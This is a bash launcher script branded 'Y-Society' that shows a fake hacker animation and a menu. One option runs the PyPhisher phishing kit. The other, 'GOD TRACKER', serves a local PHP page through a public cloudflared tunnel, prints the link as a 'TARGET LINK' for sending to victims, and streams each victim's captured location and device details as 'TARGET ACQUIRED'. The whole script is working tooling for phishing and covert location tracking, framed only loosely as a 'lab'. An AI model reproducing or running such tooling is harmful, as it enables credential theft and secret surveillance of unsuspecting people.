#!/bin/bash

# --- COLORS ---
G='\033[1;32m'
R='\033[1;31m'
C='\033[1;36m'
Y='\033[1;33m'
B='\033[1;34m'
W='\033[1;37m'
NC='\033[0m'

# --- 30-SECOND ULTRA FAST MATRIX ANIMATION ---
cyber_intro() {
    clear
    echo -e "${B}[SYSTEM] INITIALIZING Y-SOCIETY HIGH-SPEED CORE...${NC}"
    sleep 1
    
    start_time=$(date +%s)
    # 30 Seconds Duration
    while [ $(( $(date +%s) - start_time )) -lt 30 ]; do
        # Removing sleep for "Very Fast" effect
        # Generating unlimited random text blocks
        printf "${C}$(tr -dc 'A-Za-z0-9!@#$%^&*()' < /dev/urandom | head -c 200)${NC}\n"
        
        # Periodic Blue "INSTALLING" trigger
        if [ $(( RANDOM % 20 )) -eq 1 ]; then
            echo -e "${B}[+] INSTALLING NEURAL_LINK_MODULE... [DONE]${NC}"
        fi
    done

    clear
    echo -e "${G}>>> ACCESS GRANTED: Y-SOCIETY MAINFRAME UNLOCKED <<<${NC}"
    sleep 1
    clear
    
    # --- LARGE BRANDING ---
    echo -e "${C}"
    echo " ██╗   ██╗     ███████╗ ██████╗  ██████╗██╗███████╗████████╗██╗   ██╗"
    echo " ╚██╗ ██╔╝     ██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝"
    echo "  ╚████╔╝█████╗███████╗██║   ██║██║     ██║█████╗     ██║    ╚████╔╝ "
    echo "   ╚██╔╝ ╚════╝╚════██║██║   ██║██║     ██║██╔════╝     ██║     ╚██╔╝  "
    echo "    ██║        ███████║╚██████╔╝╚██████╗██║███████╗     ██║      ██║   "
    echo "    ╚═╝        ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝     ╚═╝      ╚═╝   "
    echo -e "                                              ${W}SIR YASIR RAHIM${NC}"
    echo -e "${B}======================================================================${NC}"
    sleep 2
}

# --- TRACKER LOGIC (Option 2 Fix) ---
start_tracker() {
    clear
    echo -e "${Y}[!] STARTING GOD-TRACKER ENGINE...${NC}"
    
    # Cleaning old logs
    rm -f .cflink location.txt > /dev/null 2>&1
    touch location.txt

    # Starting PHP Server in background
    php -S 127.0.0.1:8080 > /dev/null 2>&1 &
    PHP_PID=$!

    # Starting Tunnel (Cloudflared is recommended for Termux/Linux)
    echo -e "${C}[*] Creating Secure Tunnel Link...${NC}"
    cloudflared tunnel --url http://127.0.0.1:8080 > .cflink 2>&1 &
    CF_PID=$!

    sleep 10 # Waiting for link generation
    
    # Extracting the link
    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .cflink)

    if [ -z "$link" ]; then
        echo -e "${R}[!] Link Generation Failed. Check Internet/Cloudflared.${NC}"
        kill $PHP_PID $CF_PID > /dev/null 2>&1
        return
    fi

    echo -e "${G}[+] TARGET LINK:${W} $link${NC}"
    echo -e "${B}--------------------------------------------------${NC}"
    echo -e "${Y}[*] WAITING FOR TARGET... (Press Ctrl+C to Stop)${NC}"
    echo -e "${B}--------------------------------------------------${NC}"

    # Target Capture Loop
    tail -f location.txt | while read line; do
        if [ ! -z "$line" ]; then
            echo -e "\n${G}[!!!] TARGET ACQUIRED [!!!]${NC}"
            echo -e "${C}DETAILS: ${W}$line${NC}"
            echo -e "${B}--------------------------------------------------${NC}"
        fi
    done

    # Clean up on exit
    kill $PHP_PID $CF_PID > /dev/null 2>&1
}

# --- MAIN MENU ---
menu() {
    echo -e "\n${B}[ SELECT LAB MODULE ]${NC}"
    echo -e "${Y}[1]${NC} PHISHING (PyPhisher)"
    echo -e "${Y}[2]${NC} GOD TRACKER (Location + Device Info)"
    echo -e "${Y}[3]${NC} EXIT LAB"
    echo -e "${B}==================================================${NC}"
    echo -ne "${C}SIR YASIR @ COMMAND >> ${NC}"
    read choice
}

# --- EXECUTION ---
cyber_intro

while true; do
    menu
    case $choice in
        1) 
            echo -e "${G}[+] Initializing PyPhisher...${NC}"
            if [ -f "pyphisher.py" ]; then
                python3 pyphisher.py 
            else
                echo -e "${R}[!] Error: pyphisher.py not found.${NC}"
            fi
            ;;
        2)
            start_tracker
            ;;
        3) 
            echo -e "${R}[!] Terminating Lab Sessions... Goodbye.${NC}"
            exit 0
            ;;
        *)
            echo -e "${R}[!] ACCESS DENIED: INVALID COMMAND${NC}"
            sleep 1
            clear
            ;;
    esac
done
